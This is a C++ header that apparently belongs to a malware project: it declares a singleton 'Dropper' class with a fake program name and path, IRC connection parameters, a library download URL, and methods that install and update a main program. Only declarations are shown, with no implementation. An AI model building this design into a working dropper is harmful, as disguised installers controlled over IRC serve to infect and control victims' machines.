#pragma once

#include <px_client.h>

#include <IRCClient.h>
#include <px_def.h>
#include <px_file.h>
#include <url_helper.h>

namespace projx {

	class Dropper : public Client {
		std::string fake_prog_name;
		File *fake_path;
		File *main_prog_path, *launcher_path;
		Dropper();
		~Dropper();
	public:
		Dropper(const Dropper &) = delete;
		Dropper(Dropper &&) = delete;
		static Dropper &GetInstance();
		ProgError Start() override;
		ProgError RunFrame();
		std::string get_fake_prog_name() const;
		File &get_fake_path() const;
		IrcConnectParams GetIrcParams() const override;
		std::string GetLibListUrl() const override;
		Dropper &operator=(const Dropper &) = delete;
		Dropper &operator=(Dropper &&) = delete;
	private:
		ProgError UpdateMainProg();
		ProgError InstallMainProg();
	};

}  // namespace projx
